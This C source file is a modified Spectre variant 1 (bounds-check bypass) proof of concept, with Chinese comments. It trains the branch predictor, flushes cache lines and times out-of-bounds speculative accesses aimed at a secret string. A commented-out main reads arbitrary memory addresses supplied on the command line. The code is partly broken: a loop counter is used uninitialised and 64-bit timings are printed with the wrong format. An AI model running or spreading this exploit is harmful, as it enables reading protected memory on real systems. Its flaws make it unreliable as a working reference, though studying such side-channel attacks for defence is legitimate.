#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif


unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];
uint64_t  res1[256];
uint64_t  res2[256];
char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0;
int ind1 ;
int ind2 ;	
void victim_function(size_t x)
{
	//array1_size=16
	//x将会是连续固定符合要求的值，然后是一个恶意的地址
	//恶意的地址由于分支预测的问题，将会被执行
	if (x < array1_size)
	{
		//恶意的地址在开始时是按照相对于array1的起始地址给的
		//array1[x]的范围仍旧是0-255，将这个值作为索引乘以512，访问array2
		temp &= array2[array1[x] * 512];
	}
}



#define CACHE_HIT_THRESHOLD (80)


void readMemoryByte(size_t malicious_x)
{

	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;//unsigned int
	register uint64_t time1, time2;
	volatile uint8_t *addr;
    ind1=0;
	ind2 = 0; 
	for (i = 0; i < 256; i++){
		//用于纪录探测结果的数组
		res1[i] = 0;
		res2[i] = 0;
	}



	
		//array1 size = 16
		training_x = tries % array1_size;
		for (j = 300; j >= 0; j--)
		{
			
			for (i = 0; i < 256; i++){
				//清空用于探测的数组在cache中的元素
			_mm_clflush(&array2[i * 512]);
			}
			
		
			//将array1_size从cache中清除，以减慢victim中分支的执行
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++) {}//Delay (can also mfence)
               //每六次，五次为training_x用作训练，一次为malicious_x用作攻击 
			x = ((j % 6) - 1) & ~0xFFFF;//如果j%6==0 x=0xffff0000 否则 x=0 
			x = (x | (x >> 16));        //j%6==0时 x=0xffffffff 否则 x=0 
			x = training_x ^ (x & (malicious_x ^ training_x));//如果j%6==0,x=malicious_x or training_x 
			//x的结果为,部分满足分支条件，然后使用内核地址访问，此时分支预测器会认为是要执行的，此时就会出现问题
			
			time1 = __rdtscp((unsigned int*)&junk);
			victim_function(x);
			time2 = __rdtscp((unsigned int*)&junk) - time1;
			if(j%6==0){
				res1[ind1] = time2;
				ind1++;
			}else{
				res2[ind2] = time2;
				ind2++;
			}
			
			
		}

	

}
//malicious 恶意的
int main(int argc, const char **argv)
{
	//将绝对地址转换为相对地址，因为之后是作为array1的索引使用
	size_t malicious_x=(size_t)(secret-(char*)array1);
	readMemoryByte(malicious_x);
	for(int i=0;i<ind1;i++){
		printf("%d ",res1[i]);
	}
	 printf("\nres2 ----\n");
		for(int i=0;i<ind2;i++){
		printf("%d ",res2[i]);
	}
	printf("\n");
//	int i, score[2], len=40;
//	uint8_t value[2];
//
//	for (i = 0; i < sizeof(array2); i++)
//		array2[i] = 1;
//	if (argc == 3)
//	{
//		//可以探测任意内存位置的值 
//		sscanf(argv[1], "%x", (void**)(&malicious_x));
//		//将绝对地址转换为相对地址，因为之后是作为array1的索引使用
//		malicious_x -= (size_t)array1;
//		sscanf(argv[2], "%d", &len);
//	}
//
//	printf("Reading %d bytes:\n", len);
//	while (--len >= 0)
//	{
//		printf("Reading at malicious_x = %p... ", (void*)malicious_x);
//		readMemoryByte(malicious_x++, value, score);
//		printf("%s: ", (score[0] >= 2*score[1] ? "Success":"Unclear"));
//		printf("0x%02X=%c,score=%d ", value[0],
//		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
//		if (score[1] > 0)
//			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
//		printf("\n");
//	}
	return (0);
}

